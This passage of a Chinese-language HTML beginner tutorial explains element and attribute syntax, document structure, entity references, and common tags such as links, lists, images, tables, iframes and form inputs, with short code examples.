class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>空元素</strong>：一些元素只有一个标签，通常用来在此元素<u>所在位置插入&#x2F;嵌入一些东西</u>。这些元素被称为<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Void_element">空元素</a>。例如<code>&lt;img&gt;</code>。</p><h3 id="1-2-属性"><a href="#1-2-属性" class="headerlink" title="1.2 属性"></a>1.2 属性</h3><p>元素可以拥有属性，如下：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/grumpy-cat-attribute-small.png" alt="含有‘class=&quot;editor-note&quot;’属性的段落标签"></p><p><strong>属性必须包含</strong>：</p><ul><li>一个空格，它在属性和元素名称之间。如果一个元素具有多个属性，则每个属性之间必须由空格分隔。</li><li>属性名称，后面跟着一个等于号。</li><li>一个属性值，由一对引号（””）引起来。</li></ul><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>A link to my <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.mozilla.org/&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;The Mozilla homepage&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>favorite website<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;a&gt;&lt;/a&gt;</code>：<strong>锚</strong>，使被标签包裹的内容成为一个<strong>超链接</strong>。</li><li><code>href</code>：这个属性<u>声明超链接的 web 地址</u>。</li><li><code>title</code>：属性为超链接声明额外的信息。鼠标悬停超链接时，显示信息</li><li><code>target</code> ：属性用于指定链接如何呈现出来<ul><li><code>_self</code>：当前页面加载。（默认）</li><li><code>_blank</code>：通常在新标签页打开，但用户可以通过配置选择在新窗口打开。</li><li><code>_parent</code>：当前浏览环境的父级浏览上下文。如果没有父级框架，行为与 <code>_self</code> 相同。</li><li><code>_top</code>：最顶级的浏览上下文（当前浏览上下文中最“高”的祖先）。如果没有祖先，行为与 <code>_self</code> 相同。</li></ul></li></ul><p><strong>布尔属性</strong>：看上去没有值的属性。布尔属性通常只能有一个值，和他的属性名称相同。（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input#disabled"><code>disabled</code></a>（表示禁用）。</p><h3 id="1-3-规范"><a href="#1-3-规范" class="headerlink" title="1.3 规范"></a>1.3 规范</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <span class="hljs-comment">&lt;!--约束，声明--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- html标签表示html的开始 lang＝＂zh_CN＂表示中文(en表示英文)</span><br><span class="hljs-comment">html标签中一般分为两部分，分别是：head和body--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-comment">&lt;!--表示头部信息，一般包含三部分内容，title标签，css样式，js代码--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--表示当前页面使用UTF-8字符集--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-comment">&lt;!-- 标题 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> <span class="hljs-comment">&lt;!--body标签是整个html页面显示的主体内容--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p><code>&lt;!DOCTYPE html&gt;</code>: <strong>声明文档类型</strong>。</p><p>早期的 HTML（大约 1991-1992 年）文档类型声明类似于链接，规定了 HTML 页面必须遵从的良好规则，能自动检测错误和其他有用的东西。如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>文档类型是一个历史遗留问题，需要包含它才能使其他东西正常工作。现在，只需要知道 <code>&lt;!DOCTYPE html&gt;</code> 是最短的有效文档声明！  </p></li><li><p><code>&lt;html&gt;&lt;/html&gt;</code>: 这个元素包裹了页面中所有的内容，有时被称为<strong>根元素</strong>。</p></li><li><p><code>&lt;head&gt;&lt;/head&gt;</code>:这个元素是一个容器，它包含了所有你想包含在 HTML 页面中但<strong>不在 HTML 页面中显示</strong>的内容。包括你想在搜索结果中出现的关键字和页面描述、CSS 样式、字符集声明等等。</p></li><li><p><code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>: 这个元素代表了不能由其他 HTML 元相关元素表示的元数据，比如 <code>&lt;base&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 或<code> &lt;title&gt;</code>。</p><ul><li><p><strong>charset</strong> 属性将你的文档的字符集设置为 UTF-8</p></li><li><p><strong>name</strong> 属性和 content 属性可以一起使用。以名-值对的方式给文档提供元数据。（详情参数见<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta/name">标准元数据名称</a>）</p><p>其中name作为元数据的名称，content作为元数据的值。</p><ul><li><p>description：里面的内容会被显示在搜索引擎的结果页（增加可访问性和SEO）。</p></li><li><p>viewport：为视口的初始大小提供指示（hint）。目前仅用于移动设备。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>这个元标签告诉移动端浏览器，它们应该将视口宽度设定为设备的宽度，将文档放大到其预期大小的 100%，在移动端以你所希望的为移动优化的大小展示文档。（响应式设计）</p><ul><li><code>initial-scale</code>：设定了页面的初始缩放。</li></ul></li></ul></li></ul></li><li><p><code>&lt;link&gt;</code>外部资源链接元素。规定了当前文档与外部资源的关系。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;main.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><ul><li>rel：定义了所链接的资源与当前文档的<strong>关系</strong>。<ul><li>stylesheet：导入样式表</li><li>icon：代表当前文档的图标</li></ul></li></ul></li><li><p><code>&lt;title&gt;&lt;/title&gt;</code>: 这设置了页面的<strong>标题</strong>，也就是出现在该页面加载的浏览器标签中的内容。当页面被加入书签时，页面标题也被用来描述该页面。</p></li><li><p><code>&lt;body&gt;&lt;/body&gt;</code>: 包含了你访问页面时<strong>所有显示在页面上的内容</strong>，包含文本、图片、视频、游戏、可播放音频轨道等等。</p></li></ul><p><strong>关于空格</strong>：无论你在 HTML 元素的内容中使用多少空格（包括一个或多个空白字符或换行），当渲染这些代码的时候，HTML 解释器会将连续出现的空白字符<u>减少为一个单独的空格符</u>。</p><h3 id="1-4-实体引用：特殊符号"><a href="#1-4-实体引用：特殊符号" class="headerlink" title="1.4 实体引用：特殊符号"></a>1.4 实体引用：特殊符号</h3><p>如果只是想表达这些符号本身，必须用字符引用（表示字符的特殊编码）来表示这些特殊含义的符号。</p><table><thead><tr><th>原义字符</th><th>等价字符引用</th></tr></thead><tbody><tr><td>&lt;</td><td><code>&amp;lt;</code></td></tr><tr><td>&gt;</td><td><code>&amp;gt;</code></td></tr><tr><td>“</td><td><code>&amp;quot;</code></td></tr><tr><td>‘</td><td><code>&amp;apos;</code></td></tr><tr><td>&amp;</td><td><code>&amp;amp;</code></td></tr></tbody></table><p>要找到更多关于实体引用的信息，请参见：<a href="https://symbl.cc/cn/html-entities/">https://symbl.cc/cn/html-entities/</a></p><h2 id="2-标签-amp-属性"><a href="#2-标签-amp-属性" class="headerlink" title="2.标签&amp;属性"></a>2.标签&amp;属性</h2><ol><li><p>标签的格式:<strong>&lt;标签名＞封装的数据＜&#x2F;标签名＞</strong></p></li><li><p>标签名大小写不敏感。</p></li><li><p>标签拥有自己的属性。</p><p>分为：</p><ol><li><p><strong>基本</strong>属性(可以修改简单的样式效果):    bgcolor＝”red”</p></li><li><p><strong>事件</strong>属性(可以直接设置事件响应后的代码)： onclick＝”alert(‘你好!’);”</p><p>alert()是javaScript语言提供的一个警告框函数.</p><p>它可以接收任意参数，参数就是警告框的函数信息</p></li></ol></li><li><p>标签又分为，单标签和双标签。</p><ol><li><strong>单标签</strong>格式：＜标签名&#x2F;＞</li><li><strong>双标签</strong>格式：＜标签名＞…封装的数据…＜／标签名＞</li></ol></li></ol><p>标签不能交叉嵌套。</p><p>标签必须正确闭合。</p><p>属性必须有值，属性值必须加引号。</p><p>注释不能嵌套。</p><h3 id="常见标签及特殊用法"><a href="#常见标签及特殊用法" class="headerlink" title="常见标签及特殊用法"></a>常见标签及特殊用法</h3><p>可以参考下面这个网站：</p><p><a href="https://www.w3school.com.cn/html/index.asp">https://www.w3school.com.cn/html/index.asp</a></p><ul><li><p>font字体标签（已经被弃用）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&quot;red&quot;</span> <span class="hljs-attr">face</span>=<span class="hljs-string">&quot;宋体&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;7&quot;</span>&gt;</span>内容<span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>标题标签：<code>&lt;h1&gt;</code>到<code> &lt;h6&gt;</code></p></li><li><p>超链接：<code>&lt;a&gt;</code> 网页中点击可以跳转的都是超链接</p><p>a标签的href属性设置连接的地址</p><p>target设置哪个目标进行跳转</p><ul><li><strong>_self:</strong> 在当前页面（默认）</li><li><strong>_blank:</strong> 新开一个页面</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_self&quot;</span>&gt;</span>baidu-self<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>baidu-blank<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>a标签还可实现邮件发送，可以使用<code> a</code>元素和 <code>mailto:URL 协议</code>  实现。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mailto:nowhere@mozilla.org&quot;</span>&gt;</span>向 nowhere 发邮件<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 当然也可以指定更详细的 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span></span><br><span class="hljs-tag">  <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mailto:nowhere@mozilla.org?cc=name2@rapidtables.com&amp;bcc=name3@rapidtables.com&amp;subject=The%20subject%20of%20the%20email&amp;body=The%20body%20of%20the%20email&quot;</span>&gt;</span><br>  发送含有 cc、bcc、主题和主体的邮件<br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br></code></pre></td></tr></table></figure></li><li><p>列表标签</p><ul><li>无序列表<code>ul</code></li><li>有序列表<code>ol</code></li><li>列表项<code>li</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>img标签：空元素。用于在html页面上显示图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;图片找不到&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>//src：图片路径<br>//alt：备选文本。当浏览器无法载入图像时，替换文本属性可告诉读者他们失去的信息。<br></code></pre></td></tr></table></figure><p>路径分为相对路径和绝对路径。</p><ul><li>相对路径：从工程名开始算<ul><li>.           表示当前文件所在的目录</li><li>..          表示当前文件所在的上一级目录</li><li>文件名 表示当前文件所在目录的文件，相当于.&#x2F;（省略了.&#x2F;）</li></ul></li><li>绝对路径：盘符:&#x2F;目录&#x2F;文件名</li></ul></li><li><p>表格</p><ul><li><p>table 标签是表格标签</p></li><li><p>caption 展示一个表格的<strong>标题</strong>。常作为table的第一个子元素出现，同时出现表格的最前面。</p><ul><li>可使用css中的<strong>caption-side</strong>属性，指定标题的位置（例如<code>caption-side</code>)。</li></ul></li><li><p>thead 定义了一组定义表格的列头的<strong>行</strong>。</p></li><li><p>tbody 表格<strong>主体</strong>元素</p><ul><li>封装了一系列表格的行（tr)</li></ul></li><li><p>tfoot 定义了一组表格中各列的汇总<strong>行</strong>。</p></li><li><p>tr  是行标签</p></li><li><p>th 是表头标签</p></li><li><p>td 是单元格标签</p></li><li><p>align可设置单元格对其</p></li><li><p>cellspacing 单元格间距</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;300&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;300&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1.3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2.1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2.3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3.2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3.3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p>​<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230228111559367.png" alt="image-20230228111559367" style="zoom:50%;" /></p><ul><li><p>跨行跨列表格</p><ul><li>colspan: 横跨</li><li>rowspan: 纵跨</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;500&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500&quot;</span> <span class="hljs-attr">cellspacing</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1.3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1.4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1.5<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">rowspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>2.1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2.3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2.4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3.2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3.3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3.4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3.5<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4.1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4.2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4.3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">rowspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>4.4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>5.1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>5.2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>5.3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230228120659497.png" alt="image-20230228120659497" style="zoom:33%;" /></li><li><p>frame标签</p><ul><li><code>&lt;frame&gt; </code>标签定义 frameset 中的一个特定的窗口（框架）。</li><li>可以定义name来设置frame内页面的跳转。</li></ul><p>案例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;abc&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./hi.html&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;500px&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;300px&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;hi.html&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;abc&quot;</span>&gt;</span>hi.html<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;good.html&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;abc&quot;</span>&gt;</span>good.html<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mimi.html&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;abc&quot;</span>&gt;</span>mimi.html<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>表单标签form</p><ul><li><p>表单的属性action是设置提交的服务器地址，method设置提交的方式（默认Get、可选Post）</p><ul><li>GET请求的特点是：<ol><li>浏览器地址栏中的地址是：action属性［＋？＋请求参数］<br>请求参数的格式是：name＝value＆name＝value</li><li>不安全</li><li>它有数据长度的限制</li></ol></li><li>POST请求的特点是：<ol><li>浏览器地址栏中只有action属性值</li><li>相对于GET请求要安全</li><li>理论上没有数据长度的限制</li></ol></li><li>提交失败 可能的原因：<ol><li>表单项没有name属性值 </li><li>单选、复选（下拉列表中的option标签）都需要添加value属性</li><li>表单项不在提交的form中</li></ol></li></ul></li><li><p>input：基于 Web 的表单创建交互式控件，以便接受来自用户的数据。</p><ul><li>type：输入类型。具体可参考文档，常用的有例如text、password、reset、submit、file、hidden等。<ul><li>email：验证是否为正确邮件地址形成的字符串</li></ul></li><li>value：按钮上的默认字</li><li>placeholder：当没有值设定时，出现在表单控件上的文字（提示用户输入信息）</li><li>required：一个布尔属性，如果存在，则表示用户必须在提交表单之前指定一个非空值。</li><li>checked&#x3D;”checked”：默认选中该选项。</li><li>minlength : 